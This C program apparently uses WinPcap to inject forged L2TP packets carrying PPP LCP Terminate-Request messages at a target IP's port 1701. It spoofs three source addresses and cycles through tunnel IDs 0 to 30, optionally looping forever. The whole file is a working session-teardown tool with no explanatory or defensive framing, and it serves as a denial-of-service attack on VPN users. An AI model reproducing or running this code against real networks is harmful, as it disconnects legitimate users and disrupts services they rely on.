#define HAVE_REMOTE
#include <Winsock2.h>
#include <ws2tcpip.h>
#include <pcap.h>
#pragma comment(lib, "wpcap.lib")
#include <stdio.h>
#include <cassert>
#include <cctype>
#pragma comment(lib, "Ws2_32.lib")
#define INPUT_FROM_ARG

//typedef void(* pcap_handler)(u_char *user, const struct pcap_pkthdr *pkt_header, const u_char *pkt_data)
void my_pcap_handler(u_char *user, const struct pcap_pkthdr *pkt_header, const u_char *pkt_data);

#define ETHER_ADDR_LEN 6
//from linux's ethernet.h
#define ETHERTYPE_PUP           0x0200          /* Xerox PUP */
#define ETHERTYPE_SPRITE        0x0500          /* Sprite */
#define ETHERTYPE_IP            0x0800          /* IP */
#define ETHERTYPE_ARP           0x0806          /* Address resolution */
#define ETHERTYPE_REVARP        0x8035          /* Reverse ARP */
#define ETHERTYPE_AT            0x809B          /* AppleTalk protocol */
#define ETHERTYPE_AARP          0x80F3          /* AppleTalk ARP */
#define ETHERTYPE_VLAN          0x8100          /* IEEE 802.1Q VLAN tagging */
#define ETHERTYPE_IPX           0x8137          /* IPX */
#define ETHERTYPE_IPV6          0x86dd          /* IP protocol version 6 */
#define ETHERTYPE_LOOPBACK      0x9000          /* used to test interfaces */

struct   ether_header{
	u_char   ether_dhost[ETHER_ADDR_LEN];
	u_char   ether_shost[ETHER_ADDR_LEN];
	u_short   ether_type;  //如果上一层为IP协议。则ether_type的值就是0x0800
};

char* prase_ether_host(u_char ether_host[ETHER_ADDR_LEN], char* buffer);

struct ip_header  //小端模式__LITTLE_ENDIAN
{
	unsigned   char		ihl:4;				//ip   header   length
	unsigned   char		version:4;			//version
	u_char				tos;				//type   of   service
	u_short				tot_len;			//total   length
	u_short				id;					//identification
	u_short				frag_off;			//fragment   offset
	u_char				ttl;				//time   to   live
	u_char				protocol;			//protocol   type
	u_short				check;				//check   sum
	u_int				saddr;				//source   address
	u_int				daddr;				//destination   address
};


struct tcphdr //小端模式__LITTLE_ENDIAN
{
    u_int16_t source;
    u_int16_t dest;
    u_int32_t seq;
    u_int32_t ack_seq;
    u_int16_t res1:4;
    u_int16_t doff:4;
	u_int16_t fin:1;
	u_int16_t syn:1;
	u_int16_t rst:1;
	u_int16_t psh:1;
    u_int16_t ack:1;
    u_int16_t urg:1;
    u_int16_t res2:2;
    u_int16_t window;
    u_int16_t check;
    u_int16_t urg_ptr;
};



struct udp_header
{
  u_int16_t source;         /* source port */
  u_int16_t dest;			/* destination port */
  u_int16_t len;            /* udp length */
  u_int16_t checkl;         /* udp checksum */
};

char* uint_to_addr(u_int addr);

u_int16_t in_cksum (u_int16_t * addr, int len)
{
	int     nleft = len;
	u_int32_t sum = 0;
	u_int16_t *w = addr;
	u_int16_t answer = 0;

	/*
	* Our algorithm is simple, using a 32 bit accumulator (sum), we add
	* sequential 16 bit words to it, and at the end, fold back all the
	* carry bits from the top 16 bits into the lower 16 bits.
	*/
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
	/* mop up an odd byte, if necessary */
	if (nleft == 1) {
		* (unsigned char *) (&answer) = * (unsigned char *) w;
		sum += answer;
	}

	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
	sum += (sum >> 16);     /* add carry */
	answer = ~sum;     /* truncate to 16 bits */
	return (answer);
}

struct L2tp_header                 //定义udp头部
{
	u_short PacketType;
	u_short TunnelId;
	u_short SessionId;
	u_char Address;
	u_char Control;
	u_short ProtocolType;
	u_char code;
	u_char identifier;
	u_short length;
};
char* device = "//Device//NPF_{06864041-9387-44DC-AF44-37779B0F2E9E}";
pcap_t* adhandle = NULL;
char errbuf[PCAP_ERRBUF_SIZE] = { 0 };

int main(int argc, char **argv)
{

	char buffer[64] = { 0 };

	ether_header* pether_header =	(ether_header*)buffer;
	ip_header* pip_header		=	(ip_header*)(buffer + sizeof(ether_header));
	udp_header* pudp_header			=	(udp_header*)(buffer + sizeof(ether_header) + sizeof(ip_header));
	L2tp_header* l2tp_header			=	(L2tp_header*)(buffer + sizeof(ether_header) + sizeof(ip_header)+sizeof(udp_header));
	//源MAC地址
	pether_header->ether_shost[0] = 0x00;
	pether_header->ether_shost[1] = 0x0c;
	pether_header->ether_shost[2] = 0x29;
	pether_header->ether_shost[3] = 0xc1;
	pether_header->ether_shost[4] = 0x0e;
	pether_header->ether_shost[5] = 0xc4;
	//目的MAC地址
	pether_header->ether_dhost[0] = 0x00;
	pether_header->ether_dhost[1] = 0x23;
	pether_header->ether_dhost[2] = 0x89;
	pether_header->ether_dhost[3] = 0x3e;
	pether_header->ether_dhost[4] = 0xac;
	pether_header->ether_dhost[5] = 0xa4;
	//l2tp段赋值
	l2tp_header->TunnelId = htons(5);
	l2tp_header->SessionId = htons(1);
	l2tp_header->Address = 0xff;
	l2tp_header->Control = 3;
	l2tp_header->ProtocolType = htons(0xc021);
	l2tp_header->code = 5;
	l2tp_header->identifier = 0x99;
	l2tp_header->length = htons(4);
	l2tp_header->PacketType = htons(2);
	pether_header->ether_type = htons(ETHERTYPE_IP);

	assert((sizeof(ip_header) % 4) == 0);
	puts("input target ip addr");
	char ip_addr_str[20];
	bool forever = false;
#ifdef INPUT_FROM_ARG
	if(argc < 2)
		return 1;
	int len = strlen(argv[1]);
	if(len > 15)
		return 1;
	for(int i=0;i<len;i++)
		if(!(isdigit(argv[1][i]) || argv[1][i] == '.'))
			return 1;
	strcpy(ip_addr_str,argv[1]);
	FILE *lock = fopen(ip_addr_str,"r");
	if(lock != NULL)
		return 1;
	lock = fopen(ip_addr_str,"w+");;
	fclose(lock);
	if(argc == 3 && strcmp(argv[2],"-l") == 0)
		forever = true;
#else
	scanf("%s",&ip_addr_str);
#endif
	//ip头赋值
	pip_header->ihl = sizeof(ip_header) / 4;
	pip_header->version = 4;
	pip_header->tos = 0;
	pip_header->tot_len = htons(sizeof(buffer) - sizeof(ether_header));
	pip_header->id = htons(0x1000);
	pip_header->frag_off = htons(0);
	pip_header->ttl = 0x80;
	pip_header->protocol = IPPROTO_UDP;
	pip_header->check = 0;
	pip_header->saddr = inet_addr("10.5.1.7");//
	pip_header->daddr = inet_addr(ip_addr_str);
	pip_header->check  = in_cksum((u_int16_t*)pip_header, sizeof(ip_header));

	//构建UDP数据头;
	pudp_header->dest = htons(1701);
	pudp_header->source = htons(1701);
	pudp_header->len = htons(sizeof(buffer) - sizeof(ether_header) - sizeof(ip_header));
	pudp_header->checkl = 0;

		pcap_if_t *alldevs;
		pcap_if_t *d;
		int inum;
		int i=0;
		pcap_t *adhandle;
		char errbuf[PCAP_ERRBUF_SIZE];
		/* Retrieve the device list */
		if(pcap_findalldevs(&alldevs, errbuf) == -1)
		{
			fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
			exit(1);
		}

		/* Print the list */
		for(d=alldevs; d; d=d->next)
		{
			printf("%d. %s", ++i, d->name);
			if (d->description)
				printf(" (%s)\n", d->description);
			else
				printf(" (No description available)\n");
		}

		if(i==0)
		{
			printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
			return 1;
		}

		printf("Enter the interface number (1-%d):",i);
#ifdef INPUT_FROM_ARG
		inum = 1;
#else
		scanf("%d", &inum);
#endif
		if(inum < 1 || inum > i)
		{
			printf("\nInterface number out of range.\n");
			/* Free the device list */
			pcap_freealldevs(alldevs);
			return 1;
		}

		/* Jump to the selected adapter */
		for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);

		/* Open the device */
		/* Open the adapter */
		if ((adhandle= pcap_open_live(d->name,	// name of the device
			65536,			// portion of the packet to capture.
			// 65536 grants that the whole packet will be captured on all the MACs.
			1,				// promiscuous mode (nonzero means promiscuous)
			1000,			// read timeout
			errbuf			// error buffer
			)) == NULL)
		{
			fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
			/* Free the device list */
			pcap_freealldevs(alldevs);
			return 1;
		}
	do	{
			for(u_char i = 0;i <=30;i++)
			//u_char i = 3;
			{
		/*			char buffer2[64] = { 0 };*/
				l2tp_header->TunnelId = htons(i);
				printf("sending %d packet\n",i);
				pip_header->saddr = inet_addr("10.5.1.7");//
				if(pcap_sendpacket(adhandle, (const u_char*)buffer, 64) == -1)
				{
					printf("[pcap_sendpacket error]/n");
					return 1;
				}
				pip_header->saddr = inet_addr("10.5.1.5");//
				if(pcap_sendpacket(adhandle, (const u_char*)buffer, 64) == -1)
				{
					printf("[pcap_sendpacket error]/n");
					return 1;
				}
				pip_header->saddr = inet_addr("10.5.1.9");//
				if(pcap_sendpacket(adhandle, (const u_char*)buffer, 64) == -1)
				{
					printf("[pcap_sendpacket error]/n");
					return 1;
				}
				Sleep(500);
			}
		}
	while(forever);
		remove(ip_addr_str);
		return 0;
}
